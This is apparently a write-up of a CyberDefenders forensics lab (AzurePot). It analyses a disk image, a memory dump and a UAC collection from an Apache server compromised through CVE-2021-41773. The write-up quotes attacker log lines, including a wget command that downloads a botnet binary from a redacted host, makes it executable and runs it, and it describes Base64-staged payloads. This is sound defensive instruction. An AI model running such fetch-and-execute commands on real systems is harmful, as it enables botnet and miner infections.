---
layout: page
title: AzurePot Lab
permalink: /cyberdefenders_azurepot/
---

Today I will start working on the AzurePot Lab from CyberDefenders. Before solving the first question, let's take a look at the provided artifacts.

## Artifacts

The challenge provides three artifacts:

- `sdb.vhd.gz` — a Virtual Hard Disk (VHD) of the main drive, obtained from an Azure disk snapshot.
- `ubuntu.20211208.mem.gz` — a memory dump created using LiME (Linux Memory Extractor).
- `uac.tgz` — an archive containing artifacts collected by UAC (Unix-like Artifacts Collector).

The first set of questions concerns the disk image (`sdb.vhd`), so our first task is to mount it and inspect its contents.

## Mounting the VHD

My initial approach was to use `guestmount`, a tool from the `libguestfs` suite that allows mounting virtual machine disk images without directly attaching them to the host system. While this is a powerful and forensic-friendly solution, it required additional setup and dependencies.

After some quick research, I found that Linux loop devices provide a much simpler approach for this image.

### What is a loop device?

A loop device is a pseudo-device that allows Linux to treat a regular file as a block device. In practice, this means that disk image files such as `.img`, `.iso`, and `.vhd` can be attached and accessed as if they were physical disks.

Once attached, standard disk utilities such as `fdisk`, `lsblk`, and `mount` can be used against the image.

### Creating the loop device

First, decompress the image:

```bash
gunzip sdb.vhd.gz
```

Then create a loop device:

```bash
sudo losetup -Pf sdb.vhd
```

Options used:

- `-f` — automatically finds the first available loop device.
- `-P` — scans the image for partitions and creates partition mappings.

Verify which loop device was assigned:

```bash
losetup
```

or

```bash
lsblk
```

Example output:

```text
loop0
├─loop0p1
└─loop0p2
```

### Mounting the partition

After identifying the partition of interest, mount it:

```bash
sudo mkdir -p /mnt/vhd
sudo mount -o ro /dev/loop0p1 /mnt/vhd
```

The `-o` flag allows additional mount options to be specified. In this case, `ro` mounts the filesystem as read-only, preventing accidental modifications to the evidence.

Once mounted, the filesystem becomes accessible under `/mnt/vhd`.

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/mount.webp' | relative_url }}"
    alt="Mounted VHD using Linux loop devices"
    width="900">

  <figcaption>
    Mounting the VHD using Linux loop devices
  </figcaption>
</figure>

> **Forensic Note:** When working with disk images, it is generally recommended to mount them read-only. This helps preserve the integrity of the evidence and prevents accidental modifications during analysis.

## Alternative Approach: guestmount

Another option is to use `guestmount`, which is part of the `libguestfs` toolkit.

Unlike loop devices, `guestmount` does not expose the image through the kernel's block device subsystem. Instead, it uses a userspace appliance to inspect and mount virtual disks. This approach is often preferred in forensic environments because it provides better isolation and supports a wide range of virtual disk formats.

### Installation

```bash
sudo apt install libguestfs-tools
```

### Enumerating filesystems

Before mounting the image, identify available filesystems:

```bash
virt-filesystems -a sdb.vhd --all --long
```

Example output:

```text
Name       Type        VFS
/dev/sda1  filesystem  ext4
/dev/sda2  filesystem  swap
```

### Mounting the image

```bash
mkdir /mnt/vhd

guestmount \
  -a sdb.vhd \
  -m /dev/sda1 \
  --ro \
  /mnt/vhd
```

The `--ro` option mounts the image in read-only mode, which is strongly recommended during forensic analysis.

### Unmounting

```bash
guestunmount /mnt/vhd
```

## Loop Devices vs Guestmount

Both approaches allow access to files stored inside virtual disk images, but they work differently.

### Loop Devices

**Advantages**

- Built into the Linux kernel.
- Fast and easy to use.
- Minimal setup required.
- Works with standard Linux tools.

**Disadvantages**

- Less isolated from the host system.
- Easier to accidentally mount read-write.
- Limited to formats supported by the kernel.

### Guestmount

**Advantages**

- Better isolation from the host system.
- Supports many virtual disk formats.
- Well suited for forensic workflows.
- Read-only access is straightforward.

**Disadvantages**

- Requires additional dependencies.
- More complex setup.
- Slightly slower than loop devices.

For this challenge, the loop device approach was sufficient and significantly quicker to set up. Since the image could be mounted without any compatibility issues, it was the most practical option for the initial analysis.

With the disk mounted, we can now start examining the filesystem and answering the first set of challenge questions.

## Question 1

**There is a script that runs every minute to do cleanup. What is the name of the file?**

Since the question mentions a script running every minute, my first thought was **cron jobs**. On Linux systems, recurring scheduled tasks are commonly managed by the `cron` daemon.

Cron configurations can be found in several locations, including:

```text
/etc/crontab
/etc/cron.d/
/var/spool/cron/
/var/spool/cron/crontabs/
```

While examining the mounted disk image, I navigated to the cron spool directory:

```bash
cd /mnt/vhd/var/spool/cron
ls
```

This revealed a `crontabs` directory containing user-specific cron configurations.

```bash
sudo ls crontabs/
```

Output:

```text
root
```

Since only the root user had a crontab configured, I inspected its contents:

```bash
sudo cat crontabs/root
```

Near the end of the file, I found the following entry:

```text
* * * * * /root/[REDACTED]
```

The five asterisks indicate that the command executes every minute.

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/crontab.webp' | relative_url }}"
    alt="Crontab for root"
    width="900">

  <figcaption>
    Crontab for root
  </figcaption>
</figure>

## Question 2

**The script in Q1 terminates processes associated with two Bitcoin miner malware files. What is the name of the first malware file?**

After identifying the cron job, the next step was to inspect the script being executed every minute.

```bash
sudo cat /mnt/vhd/root/[REDACTED]
```

Contents:

```bash
#!/bin/bash

for PID in `ps -ef | egrep "[REDACTED]" | grep "/tmp" | awk '{ print $2 }'`
do
    kill -9 $PID
done

chown root.root /tmp/k*
chmod [REDACTED] /tmp/k*
```

The script enumerates running processes and searches for two specific process names before terminating them with `kill -9`.

The interesting part is the `egrep` expression, which contains the names of both suspected cryptomining malware processes.

```bash
ps -ef | egrep "[REDACTED]"
```

Since the question asks for the name of the first malware file, we can extract the answer directly from this expression.

## Question 3 

**The script changes the permissions for some files. What is their new permission?**

Solution is in the script file I presented in previous question

## Question 4

**What is the SHA256 of the botnet agent file?**

At first, I focused on the `/tmp` directory because the cleanup script from previous questions was targeting files located there. However, none of the files I examined appeared to be the botnet agent referenced by the challenge.

Since the lab revolves around a compromised Apache server, I shifted my attention to the web server logs. Attackers often download and execute payloads directly from the command line using tools such as `wget` or `curl`, leaving traces in shell history, process listings, or web server logs.

I navigated to the Apache logs:

```bash
cd /mnt/vhd/var/log/apache2
```

and started looking for suspicious commands:

```bash
grep -RiE "wget|curl" .
```

This quickly revealed several interesting requests and command executions.

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/apachelogs1.webp' | relative_url }}"
    alt="Apache logs reveal some insight"
    width="900">

  <figcaption>
    Apache logs reveal suspicious download activity
  </figcaption>
</figure>

While reviewing the commands executed by the attacker, I noticed references to `chmod +x`, which is commonly used after downloading a binary to make it executable.

To narrow down the investigation, I searched specifically for those commands:

```bash
grep -Ri "chmod +x" .
```

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/apachelogs2.webp' | relative_url }}"
    alt="Searching for chmod executions"
    width="900">

  <figcaption>
    Looking for executable payloads
  </figcaption>
</figure>

This led me to the location of the downloaded binary.

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/apachelogs3.webp' | relative_url }}"
    alt="Location of the botnet agent"
    width="900">

  <figcaption>
    Identifying the botnet agent location
  </figcaption>
</figure>

After locating the file, I calculated its SHA256 hash:

```bash
sha256sum dk86
```

## Question 5

**What is the name of the botnet in Q4?**

After identifying the suspicious binary and calculating its SHA256 hash in the previous question, the next step was to determine whether the sample was already known to threat intelligence platforms.

A quick search using the hash on VirusTotal revealed that the file had been analyzed by multiple security vendors.

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/virustotal.webp' | relative_url }}"
    alt="VirusTotal analysis"
    width="900">

  <figcaption>
    VirusTotal analysis of the recovered binary
  </figcaption>
</figure>

Among the available metadata, VirusTotal provides several useful fields, including detection names, threat categories, and family labels assigned by various security vendors.

The answer can be found in the **Family labels** section of the report.



## Question 6

**What IP address matches the creation timestamp of the botnet agent file in Q4?**

In the previous question, we identified the botnet agent downloaded by the attacker. To determine where it originated from, I went back to the Apache logs and searched for references to the filename.

```bash
grep 'dk86' error_log
```

This revealed the exact command executed on the compromised system:

```text
wget -O dk86 http://[REDACTED]/...
chmod +x dk86
./dk86
```

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/ip_addr.webp' | relative_url }}"
    alt="Apache log showing malware download"
    width="900">

  <figcaption>
    Apache logs showing the malware download command
  </figcaption>
</figure>

The log entry contains the remote host from which the binary was downloaded. To verify the correct source, compare the timestamp of the download request with the creation timestamp of the botnet agent file identified in Question 4.

Once the timestamps are correlated, the matching IP address can be extracted directly from the download command.

## Question 7

**What URL did the attacker use to download the botnet agent?**

Since we already identified the botnet agent in the previous questions, there was no need to start searching elsewhere. The Apache logs already contained the relevant information.

I reused the same log entry discovered during the investigation of Questions 4 and 6 and searched for references to the malware filename:

```bash
grep 'dk86' error_log
```

The resulting log entry showed the complete command executed by the attacker:

```text
wget -O dk86 http://[REDACTED]/...
chmod +x dk86
./dk86
```

The full URL used to retrieve the botnet agent can be extracted directly from the `wget` command present in the log entry.

## Question 8

**What is the name of the file that the attacker downloaded to execute the malicious script and subsequently remove itself?**

While reviewing the Apache logs, I encountered a suspicious `curl` request containing a large Base64-encoded payload submitted through an HTTP POST request.

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/curl_base64.webp' | relative_url }}"
    alt="Base64 encoded payload"
    width="900">

  <figcaption>
    Suspicious Base64-encoded payload in Apache logs
  </figcaption>
</figure>

This is a common attacker technique used to obfuscate commands and make malicious activity less obvious during a quick log review. The request was sent to a remote PHP script (`b64.php`), which likely decoded and executed the supplied payload on the target system.

Initially, I attempted to decode the payload directly, but the resulting data appeared incomplete. This suggested that the request body had been truncated in the log output.

To investigate further, I searched for additional occurrences of the request and displayed the following lines after each match:

```bash
grep -Ei -A 10 '\-\-data\-urlencode' error_log
```

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/curl_base64_2.webp' | relative_url }}"
    alt="Extended log output"
    width="900">

  <figcaption>
    Capturing the full request body
  </figcaption>
</figure>

The payload was spread across multiple consecutive log entries. This happens because Apache's `mod_dumpio` module logs large request bodies in chunks rather than as a single record.

After reconstructing the complete Base64 string and decoding it, I obtained another script containing an additional Base64-encoded payload.

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/curl_base64_3.webp' | relative_url }}"
    alt="Decoded payload"
    width="900">

  <figcaption>
    Decoded payload revealing the next stage
  </figcaption>
</figure>

By decoding the second-stage payload and analyzing the commands it executed, it was possible to identify the filename downloaded by the attacker. The script retrieved the file, executed it, and then removed it to reduce traces on the compromised system.

## Question 9

**The attacker downloaded SH scripts. What are the names of these files?**

At this point, I was interested in identifying all shell scripts referenced throughout the Apache logs. Instead of manually reviewing every request, I used a regular expression to extract filenames ending with `.sh`.

```bash
grep -Eo '[-a-zA-Z0-9_()+.]+\.sh' error_log | sort -u
```

Explanation:

- `-E` enables extended regular expressions.
- `-o` prints only the matching portion of each line.
- `[-a-zA-Z0-9_()+.]+` matches common filename characters.
- `\.sh` restricts the results to shell scripts.
- `sort -u` sorts the output and removes duplicates.

The resulting list provided all shell script names observed in the logs, allowing me to identify the scripts downloaded and executed by the attacker.

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/scripts.webp' | relative_url }}"
    alt="Shell scripts extracted from logs"
    width="900">

  <figcaption>
    Shell scripts extracted from Apache logs
  </figcaption>
</figure>

# UAC (Unix Artifact Collector)

Next set of quection concerns UAC file.

UAC is Open-source incident response and forensic collection tool for Unix-like systems.

## Purpose

Collects a forensic snapshot of a system at a point in time.

## Typical Data Collected

- Running processes (`ps`)
- Open files (`lsof`)
- Network connections (`ss`, `netstat`)
- User accounts
- Login history (`last`, `who`)
- Shell history
- System logs (`journalctl`, `/var/log`)
- Cron jobs
- Installed packages
- Persistence mechanisms

## Characteristics

- Read-only collection (where possible)
- Modular artifact-based design
- Supports Linux, macOS, BSD, AIX, Solaris
- Produces a structured archive for analysis

## Question 10 
**Two suspicious processes were running from a deleted directory. What are their PIDs?**

Firstly we need to unpackage uac file

```bash
gunzip -f uac.tgz
tar -xf uac.tar
mkdir uac
tar -xf uac-ApacheWebServer-linux-20211208202503.tar.gz -C uac
```

I had some back and forth with live_response/process artifacts. Finally I used 

```bash
grep -R 'tmp' 
```

I noticed some promissing stuff in lsof files

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/uac_lsof.webp' | relative_url }}"
    alt="UAC lsof logs"
    width="900">

  <figcaption>
    UAC lsof logs
  </figcaption>
</figure>


```text
sleep    PID=x   cwd   /var/tmp/.log/101068/.spoollog (deleted)
```

- `cwd` indicates the current working directory.
- The process is running from a directory that was deleted.
- This suggests cleanup/hiding occurred while the process stayed active.


```text
sh    PID=x   10r   /var/tmp/.log/101068/.spoollog/.src.sh (deleted)
```

- `10r` means file descriptor 10, opened read-only.
- The shell still has the deleted script open.
- Confirms `.src.sh` existed and was likely executed.


```text
/var/tmp/.log/101068/.spoollog
```

- Dot-prefixed names are hidden in normal `ls` output.
- Suspicious staging path under `/var/tmp`.
- Common pattern for attacker cleanup/evasion.

PIDs should be visible in blured column

## Question 11
**What is the suspicious command line associated with the PID that ends with `45` in Q10?**

So we know PIDs so now we can try to find original process in one of ps artifacts

```bash
grep -R '[REDACTED_PID]'
```

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/uac_ps.webp' | relative_url }}"
    alt="UAC lsof logs"
    width="900">

  <figcaption>
    UAC ps logs
  </figcaption>
</figure>

It becomes clear what command attacker used

## Question 12

**UAC gathered some data from the second process in Q10. What is the remote IP address and remote port that was used in the attack?**

The challenge hints that UAC collected information about the suspicious process identified in the previous question. UAC stores process-specific information under:

```text
uac/live_response/process/proc/<PID>/
```

After navigating to the directory corresponding to the second process from Question 10, I examined the environment variables captured for that process:

```bash
cat environ.txt
```

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/uac_environ.webp' | relative_url }}"
    alt="Process environment variables"
    width="900">

  <figcaption>
    Environment variables captured by UAC
  </figcaption>
</figure>

Among the captured values were two particularly interesting variables:

```text
REMOTE_ADDR=[REDACTED]
REMOTE_PORT=[REDACTED]
```

These variables are commonly populated by web servers and CGI applications to identify the client that initiated the request. In this case, they reveal the source IP address and source port used during the attack.

## Question 13

**Which user was responsible for executing the command in Q11?**

After identifying the suspicious process in the UAC collection, I examined the process listing captured by UAC.

The file:

```text
uac/live_response/process/ps_-efl.txt
```

contains output equivalent to:

```bash
ps -efl
```

I searched for the process ID identified in the previous question:

```bash
grep 20645 ps_-efl.txt
```

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/process_owner.webp' | relative_url }}"
    alt="Process owner"
    width="900">

  <figcaption>
    Process information from UAC collection
  </figcaption>
</figure>

The first column of the `ps -efl` output contains the user that launched the process. By locating the matching PID, I was able to identify the account responsible for executing the command associated with the attack.


## Question 14

**Two suspicious shell processes were running from the tmp folder. What are their PIDs?**

Since previous questions revealed attacker activity within `/tmp`, I decided to look for processes whose current working directory or open files referenced that location.

A quick recursive search through the UAC process artifacts highlighted several interesting entries:

```bash
grep -R '/tmp' .
```

The most useful results came from the `lsof` output collected by UAC:

```text
process/lsof_-nPl.txt
```

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/uac_tmp.webp' | relative_url }}"
    alt="Suspicious processes in tmp"
    width="900">

  <figcaption>
    Suspicious shell processes operating from /tmp
  </figcaption>
</figure>

The `lsof` entries showed shell processes with their current working directory (`cwd`) located inside `/var/tmp` and associated with suspicious files that had already been deleted.

By reviewing the matching `lsof` records, it was possible to identify the two shell processes operating from the temporary directory.


## Volatility setup

**Before we start analyzing memory we need to prepare symbols.

# Generating Volatility 3 Linux Symbols (Azure 5.4.0-1059)

## 1. Determine kernel version from memory dump

```bash
vol -f ubuntu.20211208.mem banners.Banners
```

Output:

```text
Linux version 5.4.0-1059-azure
```

## 2. Start Ubuntu 22.04 container

```bash
docker run --rm -it -v "$PWD:/work" ubuntu:22.04 bash
```

## 3. Download matching debug symbols

Downloaded manually from Launchpad:

```text
https://launchpad.net/ubuntu/bionic/amd64/linux-image-unsigned-5.4.0-1059-azure-dbgsym/5.4.0-1059.62~18.04.1
```

File:

```text
linux-image-unsigned-5.4.0-1059-azure-dbgsym_5.4.0-1059.62~18.04.1_amd64.ddeb
```

## 4. Install debug symbols inside container

```bash
dpkg -i /work/linux-image-unsigned-5.4.0-1059-azure-dbgsym_5.4.0-1059.62~18.04.1_amd64.ddeb
```

## 5. Verify vmlinux exists

```bash
ls /usr/lib/debug/boot/vmlinux-5.4.0-1059-azure
```

Expected:

```text
/usr/lib/debug/boot/vmlinux-5.4.0-1059-azure
```

## 6. Build dwarf2json on host

```bash
git clone https://github.com/volatilityfoundation/dwarf2json.git
cd dwarf2json
go build
```

Result:

```text
dwarf2json
```

## 7. Expose dwarf2json to container

Example:

```bash
docker run --rm -it \
  -v "$PWD:/work" \
  -v "/path/to/dwarf2json:/dwarf2json" \
  ubuntu:22.04 bash
```

## 8. Generate Volatility symbol file

Inside container:

```bash
/dwarf2json/dwarf2json linux \
  --elf /usr/lib/debug/boot/vmlinux-5.4.0-1059-azure \
  > /work/linux-5.4.0-1059-azure.json
```

## 9. Compress symbol file

```bash
xz /work/linux-5.4.0-1059-azure.json
```

Result:

```text
linux-5.4.0-1059-azure.json.xz
```

## 10. Copy symbol file to Volatility

```bash
cp linux-5.4.0-1059-azure.json.xz \
  volatility3/symbols/linux/
```

## 11. Run Volatility

```bash
vol -f ubuntu.20211208.mem linux.pslist
```

# What happened?

```text
Memory dump
    ↓
Kernel version identified (5.4.0-1059-azure)
    ↓
Matching debug symbols downloaded
    ↓
vmlinux with DWARF obtained
    ↓
dwarf2json converts DWARF → Volatility ISF JSON
    ↓
Volatility understands Linux kernel structures
    ↓
linux.pslist, linux.lsof, linux.netstat, ...
```

## Question 15

**What is the MAC address of the captured memory?**

For this question, I switched to memory analysis using Volatility 3. A good starting point when investigating a Linux memory dump is to enumerate the network interfaces present in memory.

I used the following plugin:

```bash
vol -f ubuntu.20211208.mem linux.ip.Addr
```

This plugin displays network interfaces along with their associated IP and MAC addresses.

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/ip_mac.webp' | relative_url }}"
    alt="Volatility network interfaces"
    width="900">

  <figcaption>
    Network interfaces recovered from memory
  </figcaption>
</figure>

The output shows two interfaces:

- `lo` (loopback)
- `eth0` (primary network interface)

The MAC address can be read directly from the **MAC** column of the plugin output.

## Question 16

**Based on Bash history, the attacker downloaded a shell script. What is the name of the file?**

Since the challenge specifically mentions Bash history, I turned to Volatility and extracted commands executed by users from memory.

The `linux.bash` plugin reconstructs Bash command history from memory-resident shell processes:

```bash
vol -f ubuntu.20211208.mem linux.bash
```

To quickly locate download activity, I filtered the output for references to `wget`:

```bash
vol -f ubuntu.20211208.mem linux.bash | grep -P 'wget.*sh'
```

<figure>
  <img
    src="{{ '/assets/images/posts/azurePot/bash_history.webp' | relative_url }}"
    alt="Bash history recovered from memory"
    width="900">

  <figcaption>
    Bash commands recovered from memory
  </figcaption>
</figure>


By examining the downloaded filename in the recovered Bash history, it was possible to identify the shell script referenced by the challenge.

This question highlights the value of memory forensics. Even when files have been deleted from disk, command history may still be recoverable from memory, providing insight into attacker activity. In this case, the Bash history revealed the complete sequence of downloading, executing, and deleting a malicious shell script, allowing us to identify the file despite attempts to remove evidence.

## Lab Summary

AzurePot provides a practical investigation of a real-world Linux compromise involving exploitation of **CVE-2021-41773**, a path traversal and remote code execution vulnerability affecting Apache HTTP Server. Throughout the challenge, we analyzed multiple forensic artifacts, including a disk image, memory dump, and UAC collection, to reconstruct the attack timeline and understand the adversary's actions.

The investigation revealed how the attacker leveraged the vulnerable Apache instance to execute commands remotely, download additional payloads, establish persistence, and deploy cryptocurrency mining malware. By examining cron jobs, Apache logs, process information, Bash history, memory artifacts, and threat intelligence sources, it was possible to identify malicious files, attacker infrastructure, botnet activity, and indicators of compromise.

This lab demonstrates the importance of correlating evidence from multiple sources. While individual artifacts provided isolated clues, combining disk forensics, memory analysis, and log investigation enabled a complete reconstruction of the compromise. It also highlights several common attacker techniques, including command obfuscation with Base64, staged payload delivery, execution from temporary directories, persistence through scheduled tasks, and anti-forensic cleanup mechanisms.

Overall, AzurePot is an excellent introduction to Linux incident response and forensic analysis, providing hands-on experience with real-world attacker tradecraft and the tools commonly used to investigate compromised systems.
